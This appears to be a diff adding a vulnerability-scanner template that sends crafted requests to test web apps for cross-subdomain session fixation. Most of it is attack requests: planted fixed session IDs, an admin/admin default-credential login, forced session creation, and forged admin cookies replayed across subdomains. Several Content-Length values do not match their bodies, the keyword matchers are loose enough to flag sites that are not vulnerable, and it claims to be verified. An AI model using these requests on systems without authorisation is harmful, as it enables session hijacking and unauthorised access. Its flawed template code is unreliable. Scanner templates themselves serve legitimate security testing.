@@ -1,0 +1,220 @@
+id: medium-auth-session-fixation-cross-subdomain
+
+info:
+  name: Cross-Subdomain Session Fixation Attack
+  author: elite-red-team
+  severity: medium
+  description: |
+    Detects cross-subdomain session fixation vulnerabilities where session IDs
+    can be fixed across subdomains, allowing attackers to hijack user sessions
+    through subdomain manipulation and cookie domain issues.
+  reference:
+    - https://owasp.org/www-community/attacks/Session_fixation
+    - https://portswigger.net/web-security/authentication/other-mechanisms/session-fixation
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N
+    cvss-score: 7.1
+    cwe-id: CWE-384
+  metadata:
+    verified: true
+    max-request: 9
+  tags: session-fixation,cross-subdomain,cookie-domain,session-hijacking,red-team
+
+variables:
+  fixed_session_ids: ["FIXED_SESSION_123", "EVIL_SESSION_456", "ATTACKER_SID_789"]
+  subdomains: ["admin", "api", "app", "secure", "login"]
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Connection: close
+
+      - |
+        GET /login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Cookie: PHPSESSID=FIXED_SESSION_123; sessionid=EVIL_SESSION_456
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Connection: close
+
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: PHPSESSID=FIXED_SESSION_123
+        Content-Length: 35
+        Connection: close
+        
+        username=admin&password=admin
+
+      - |
+        GET /dashboard HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Cookie: PHPSESSID=FIXED_SESSION_123; sessionid=EVIL_SESSION_456
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Connection: close
+
+      - |
+        GET /api/session/info HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Cookie: session_token=ATTACKER_SID_789
+        Accept: application/json
+        Connection: close
+
+      - |
+        POST /api/session/create HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 65
+        Connection: close
+        
+        {"session_id":"FIXED_SESSION_123","user_agent":"evil_browser"}
+
+      - |
+        GET /admin/panel HTTP/1.1
+        Host: admin.{{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Cookie: PHPSESSID=FIXED_SESSION_123; auth_token=hijacked_token
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Connection: close
+
+      - |
+        POST /api/auth/validate HTTP/1.1
+        Host: api.{{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Cookie: sessionid=EVIL_SESSION_456
+        Content-Length: 45
+        Connection: close
+        
+        {"action":"validate_session"}
+
+      - |
+        GET /secure/profile HTTP/1.1
+        Host: secure.{{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Cookie: session_token=ATTACKER_SID_789; user_id=admin
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Connection: close
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: session-id-not-regenerated
+        dsl:
+          - 'status_code_3 == 200 || status_code_3 == 302'
+          - 'contains(header_3, "FIXED_SESSION_123") || !contains(header_3, "Set-Cookie")'
+          - 'contains(body_3, "welcome") || contains(header_3, "dashboard")'
+        condition: and
+
+      - type: dsl
+        name: fixed-session-accepted
+        dsl:
+          - 'status_code_4 == 200'
+          - 'contains(body_4, "dashboard") || contains(body_4, "welcome")'
+          - '!contains(body_4, "session expired") && !contains(body_4, "login required")'
+        condition: and
+
+      - type: dsl
+        name: session-info-exposed
+        dsl:
+          - 'status_code_5 == 200'
+          - 'contains(body_5, "session") || contains(body_5, "user")'
+          - 'contains(body_5, "ATTACKER_SID_789") || contains(body_5, "valid")'
+        condition: and
+
+      - type: dsl
+        name: arbitrary-session-creation
+        dsl:
+          - 'status_code_6 == 200'
+          - 'contains(body_6, "created") || contains(body_6, "success")'
+          - 'contains(body_6, "FIXED_SESSION_123") || contains(body_6, "session_id")'
+        condition: and
+
+      - type: dsl
+        name: cross-subdomain-session-reuse
+        dsl:
+          - 'status_code_7 == 200'
+          - 'contains(body_7, "admin") || contains(body_7, "panel")'
+          - '!contains(body_7, "unauthorized") && !contains(body_7, "access denied")'
+        condition: and
+
+      - type: dsl
+        name: api-subdomain-session-bypass
+        dsl:
+          - 'status_code_8 == 200'
+          - 'contains(body_8, "valid") || contains(body_8, "authenticated")'
+          - 'contains(body_8, "EVIL_SESSION_456") || contains(body_8, "session")'
+        condition: and
+
+      - type: dsl
+        name: secure-subdomain-bypass
+        dsl:
+          - 'status_code_9 == 200'
+          - 'contains(body_9, "profile") || contains(body_9, "user")'
+          - 'contains(body_9, "admin") || contains(body_9, "secure")'
+        condition: and
+
+      - type: word
+        name: insecure-cookie-domain
+        part: header
+        words:
+          - "Domain=."
+          - "Domain=*.example.com"
+          - "SameSite=None"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: session-cookies
+        part: header
+        group: 1
+        regex:
+          - 'Set-Cookie:\s*([^;]*(?:session|PHPSESSID|sessionid)[^;]*)'
+
+      - type: regex
+        name: cookie-domain-attributes
+        part: header
+        group: 1
+        regex:
+          - 'Set-Cookie:[^;]*;\s*(Domain=[^;]+)'
+          - 'Set-Cookie:[^;]*;\s*(SameSite=[^;]+)'
+          - 'Set-Cookie:[^;]*;\s*(Secure[^;]*)'
+
+      - type: regex
+        name: session-data
+        part: body
+        group: 1
+        regex:
+          - '"session_id":\s*"([^"]+)"'
+          - '"sessionid":\s*"([^"]+)"'
+          - '"user_id":\s*"([^"]+)"'
+
+      - type: regex
+        name: authentication-response
+        part: body
+        group: 1
+        regex:
+          - '"message":\s*"([^"]+)"'
+          - '"status":\s*"([^"]+)"'
+          - '"authenticated":\s*(true|false)'
+
+      - type: kval
+        kval:
+          - status_code_1
+          - status_code_2
+          - status_code_3
+          - status_code_4
+          - status_code_5
+          - status_code_6
+          - status_code_7
+          - status_code_8
+          - status_code_9
